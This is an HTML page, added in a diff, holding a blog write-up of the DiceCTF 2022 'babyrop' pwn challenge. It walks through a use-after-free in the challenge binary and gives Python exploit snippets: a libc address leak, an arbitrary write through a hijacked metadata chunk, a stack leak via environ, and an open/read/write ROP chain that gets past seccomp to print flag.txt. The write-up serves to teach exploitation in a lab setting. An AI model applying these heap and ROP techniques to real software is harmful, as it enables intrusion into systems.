@@ -1,0 +1,226 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <meta property="og:image" content="/images/cover.jpg">
+    <title>sid main book</title>
+    <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Helvetica+Neue:400,700&display=swap" />
+    <link rel="stylesheet" href="/css/styles.css" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.8.0/styles/default.min.css">
+<script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.8.0/highlight.min.js"></script>
+  </head>
+  <body>
+    <header id=main-header>
+      <div>Sid, the personal journal</div>
+    </header>
+    <nav>
+        <a href="/">Home</a>
+        <a href="/writeups.html">Writeups</a>
+	<a href="https://github.com/sidhawkss/pwnchalls">Pwn</a>
+        <a href="/profile.html">About me</a>
+    </nav>
+    <main>
+	  <article id=content>
+		<h2>DiceCTF - babyrop</h2>
+<p>The challenge provides a binary using libc 2.34 from DiceCTF of 2022, there is a UAF vulnerability that allows us to write arbitrarily in desired locations, abusing the behavior when program allocate heap chunks. In the decompiling process, Ghidra was used, it can help us to know how the binary works by looking at the pseudo code of the program. At the beginning of the binary, we can notice the presence of the function  <mark>activate_seccomp</mark>, that probably can turn the exploitation process more difficult.</p>
+
+<pre><code class="language-c">undefined8 main(void)
+
+{
+  uint index;
+  int char_option;
+  
+  get_libc();
+  activate_seccomp();
+  while( true ) {
+    fwrite("enter your command: ",1,0x14,stdout);
+    fflush(stdout);
+    do {
+      do {
+                      // do while char = 10
+         char_option = getchar();
+      } while (char_option == 10);
+    } while (char_option == 13);
+    if (char_option == -1) break;
+    fwrite("enter your index: ",1,18,stdout);
+    fflush(stdout);
+    __isoc99_scanf(&formatstring,&index);
+    if (((int)index < 0) || (9 < (int)index)) {
+      fprintf(stdout,"index out of range: %d\n",(ulong)index);
+      fflush(stdout);
+    }
+    else {
+      switch(char_option) {
+      case 0x43:
+         create_safe_string(index);
+         break;
+      case 0x45:
+         return 0;
+      case 0x46:
+         free_safe_string(index);
+         break;
+      case 0x52:
+         read_safe_string(index);
+         break;
+      case 0x57:
+         write_safe_string(index);
+      }
+    }
+  }
+  return 0;
+}
+
+</code></pre>
+<p>The <mark>seccomp</mark> function handles the action of preparing seccomp in the binary. First, we need to understand what seccomp is. In Linux environments, sometimes we need to perform “sandboxing” actions or enhance the protection, seccomp is a Linux feature that helps us filter system calls, using seccomp filters, you can restrict the use of certain system calls.</p>
+<p>The man page lists many rules that seccomp supports, as well as deeper behaviors of the filter.</p><p>Link: <a href="https://man7.org/linux/man-pages/man2/seccomp.2.html">https://man7.org/linux/man-pages/man2/seccomp.2.html</a></p>
+
+<pre><code class="language-c">void activate_seccomp(void)
+
+{
+  long lVar1;
+  undefined8 *puVar2;
+  undefined8 *counter;
+  undefined2 local_128 [4];
+  undefined8 *local_120;
+  undefined8 local_118 [34];
+
+  puVar2 = &global_reference;
+  counter = local_118;
+  for (lVar1 = 0x21; lVar1 != 0; lVar1 = lVar1 + -1) {
+    *counter = *puVar2;
+    puVar2 = puVar2 + 1;
+    counter = counter + 1;
+  }
+  local_128[0] = 33;
+  local_120 = local_118;
+                      // PR_SET_NO_NEW_PRIVS
+  prctl(38,1,0,0,0);
+                      // PR_SET_SECCOMP
+  prctl(22,2,local_128);
+  return;
+}
+</code></pre>
+<p>
+Returning to seccomp activation, what is the relationship between seccomp and the <mark>prctl</mark> function? Let’s let the man explain it to us. I left some comments in the pseudo code, but there’s a simpler way to view the arguments passed to the function call, using <mark>strace</mark>. The <mark>strace</mark> works by tracing system calls, intercepting the calls and signals received by a process.
+</p>
+<p>Link<a href="https://man7.org/linux/man-pages/man1/strace.1.html">https://man7.org/linux/man-pages/man1/strace.1.html</a></p>
+<img src="/articles/dicectf-babyrop/images/image.png"/>
+<p>Looking at some content on seccomp and sandbox escaping, I noticed that prctl() can be used incorrectly, potentially allowing a bypass of the implemented filters.</p>
+<p>Links: <a href="https://n132.github.io/2022/07/03/Guide-of-Seccomp-in-CTF.html">https://n132.github.io/2022/07/03/Guide-of-Seccomp-in-CTF.html</a></p>
+<p><a href="https://tripoloski1337.github.io/ctf/2021/07/12/bypassing-seccomp-prctl.html">https://tripoloski1337.github.io/ctf/2021/07/12/bypassing-seccomp-prctl.html</a></p>
+<p><a href="https://github.com/torvalds/linux/blob/master/include/uapi/linux/prctl.h">https://github.com/torvalds/linux/blob/master/include/uapi/linux/prctl.h</a></p>
+<p>After some time analyzing the binary, I found two potentially useful elements for the exploit chain. First: if I allocate six chunks and a large chunk at index 0, this results in a small bin that the <mark>read_safe_string</mark> function can use to leak a LIBC address.</p>
+<p>After obtaining the leak, calculating the LIBC base offset is straightforward by decreasing with the offsett <mark>-0x1f4cc0</mark>.</p>
+<pre><code class="language-python">def leak():
+    for i in range(6):
+        create_safe_string(i,24,"AAAAAAAA")
+    for i in range(6):
+        free_safe_string(i)
+    create_safe_string(0,0x1024,"AAAAAAAA")
+    return read_safe_string(0)
+
+libc.address = leak()-0x1f4cc0
+</code></pre>
+<p>The second, and most useful, element is the presence of an arbitrary write. To exploit this vulnerability, we need to understand how the binary operates. For each created chunk where we control the chunk size, the program automatically creates a header chunk to store the size of the allocated chunk and a pointer to it.</p>
+<p>The following code snippet demonstrates this behavior: by allocating two chunks of size <mark>0x30</mark>, freeing both, and then reallocating the second chunk with the minimum size, we can push it to the <mark>0x20</mark> free list, which allows control over the header of the first chunk. This gives us control over the write size and the destination pointer. In this case, I chose address <mark>0x404090</mark>, as the binary doesn’t use PIE.</p>
+<pre><code class="language-python">create_safe_string(1,0x30,"BBBBBBBB")
+create_safe_string(2,0x30,"BBBBBBBB")
+free_safe_string(1)
+free_safe_string(2)
+create_safe_string(2,20,p64(0x41)+p64(0x404090)) # -> control header/chunk 8
+write_safe_string(1,"YYYYYYYY")
+</code></pre>
+<p>Next, we have an illustration to demonstrate the arbitrary write control. When two chunks are allocated, each one follows a sequence: a <mark>0x20</mark> metadata chunk, followed by the actual chunk (e.g., with a size of <mark>0x30</mark>). The metadata chunk is used by the binary to perform actions like writing data. It includes a pointer that indicates the location of the corresponding <mark>0x30</mark> chunk.</p>
+<p>To control a metadata chunk, allocate two chunks with sizes different than <mark>0x20</mark>, and then allocate a subsequent chunk of size <mark>0x20</mark>. This will pop and use the second metadata chunk as the metadata for the new chunk, while the metadata chunk of the first chunk becomes the controlled chunk. This allows us to set its values. After this allocation, if we write a size and an arbitrary pointer, it becomes possible to write to arbitrary addresses.</p>
+<img src="/articles/dicectf-babyrop/images/image 1.png"/>
+<p>Look at the heap data:</p>
+<pre><code class="language-shell">
+0x4b2730	0x0000000000000000	0x0000000000000021	........!.......
+0x4b2740	0x0000000000000041	0x0000000000404090	A........@@.....
+</code></pre>
+<p>Calling the write funtion <mark>write_safe_string</mark>, the function selects the pointer to the chunk using the index received as an argument, the first address of the previous code block, line <mark>0x4b2740</mark> will be the size, in this case 0x41, and the second address is the target, <mark>0x404090</mark>.</p>
+<p>After call the function, look that the payload has been placed in the desired location. Now there are some problems to be solved, how can I get command execution in a more modern LIBC or continue doing the chain? I already have an libc address and a AB write primitive.</p>
+<pre><code class="language-shell">pwndbg> x/2gx 0x404090
+0x404090:	0x5959595959595959	0x0000000000000000
+</code></pre>
+<p>Searching, I found a post from nobodyisnobody explaining how to get code execution in the latest libc, I delved into some articles like kylebot's and niftic's blog, all related to FSOP (File Stream Oriented Programming) which is a technique used to modify structure pointers to get reading and writing, data leaking and execution. That’s is not our case, I thought of a simpler way to exploit the bug, like corrupt some return address and turning it into a ROP chain. If we think, this method is more plausible, also because of the seccomp.</p>
+<p>For example, if we try to call some not allowed system call, the return will be:</p>
+<pre><code>stopped with exit code -31 (SIGSYS) </code></pre>
+<p>Searching, I found a technique to leak strack address using the environ structure stored in the libc, we can abuse of this behavior to leak the an address. </p>
+<p>Link: <a href="https://github.com/Naetw/CTF-pwn-tips?tab=readme-ov-file#leak-stack-address">https://github.com/Naetw/CTF-pwn-tips?tab=readme-ov-file#leak-stack-address</a></p>
+<p>It’s necessary to exploit the arbitrary write again, but this time we need to put the environment address into the corrupted chunk pointer and trigger a read to get the stack address.</p>
+<pre><code>create_safe_string(1,0x80,"B")
+create_safe_string(2,0x80,"B")
+free_safe_string(1)
+free_safe_string(2)
+create_safe_string(2,20,p64(0x21) + p64(libc.address + env_offset)) # -> control header/chunk 8
+stack_address = read_safe_string(1,2) # -> leak - stack
+</code></pre>
+<p>Now with the stack address it’s needed to find a return address to place the ROP chain sequence. The ROP (Return Oriented Programming), is a technique that uses program or loaded libraries  addresses to execute assembly opcodes sequences. It’s based on gadgets that have a “ret” operation code, allowing us to proceed to other operation codes.</p>
+<p>With the seccomp-tools binary, we can inspect the applied filters, know the restrictions and the allowed system calls.</p>
+<p>Link: <a href="https://github.com/david942j/seccomp-tools">https://github.com/david942j/seccomp-tools</a></p>
+<p>Note that the open, read and write system calls are allowed, the unique paths that we need to read a file.</p>
+<img src="/articles/dicectf-babyrop/images/image 2.png"/>
+<p>In this context, the file to be read was written to a writable region <mark>0x404120</mark>.</p>
+<pre><code class="language-python">create_safe_string(5,0x70,"B")
+create_safe_string(6,0x70,"B")
+free_safe_string(5)
+free_safe_string(6)
+create_safe_string(6,20,p64(0x100) + p64(w_region))
+write_safe_string(5,b"./flag.txt\x00")
+</code></pre>
+<p>The next code snippet, triggers an arbitrary write to the return value of the current exection, at the offset <mark>0x190</mark>, allowing us to proceed with the ROP chain.</p>
+<pre><code class="language-python">create_safe_string(7,0x30,"B")
+create_safe_string(8,0x30,"B")
+free_safe_string(7)
+free_safe_string(8)
+create_safe_string(8,20,p64(0x100) + p64(stack_address - 0x190))
+</code></pre>
+<p>The next step of the exploit is: use the <mark>write_safe_string</mark> function to execute our shellcode. It’s very simple to understand the ROP chain, because of the pure system instruction gadgets, we cannot use open and other system calls directly, so it’s common to spawn it from libc. The open function will open the desired file that was stored at the address <mark>0x404120</mark> → <mark>flag.txt</mark>, the file descriptor 3 (open file) was used to write the data to a writable region, <mark>0x404120</mark> too. The last call made writes the data from the writable region to standard output, completing the exploration.</p>
+<pre><code class="language-python">write_safe_string(7,
+    p64(libc.address + 0x000000000002d13f)+ # DEBUGGING
+    p64(pop_rdi) + p64(0x404120)+
+    p64(pop_rsi) + p64(0x0)+
+    p64(pop_rsi) + p64(0x0)+
+    p64(libc.sym["open"])+
+    p64(pop_rdi) + p64(0x3)+
+    p64(pop_rsi) + p64(w_region)+
+    p64(pop_rdx) + p64(0x30)+
+    p64(libc.sym["read"])+
+    p64(pop_rdi) + p64(0x1)+
+    p64(pop_rsi) + p64(w_region)+
+    p64(pop_rdx) + p64(0x30)+
+    p64(libc.sym["write"]))
+</code></pre>
+<p>Entire exploit code: <a href="https://github.com/sidhawkss/pwnchalls/blob/main/random-challenges/babyrop22/solve.py">https://github.com/sidhawkss/pwnchalls/blob/main/random-challenges/babyrop22/solve.py</a></p>
+
+	  </article>
+    </main>
+    <footer><p>&copy; 2023 sidhawks.</p></footer>
+  </body>
+
+
+<script>
+hljs.highlightAll();
+</script>
+<style>
+
+article img {
+  max-width: 100%;
+  height: auto;
+  display: block;
+}
+
+mark {
+  background-color: #d6d6d6; /* your custom color */
+  color: #e1330d; /* text color inside mark */
+  padding: 2 12px;
+  border-radius: 3px;
+
+}
+
+</style>
+
+</html>
+
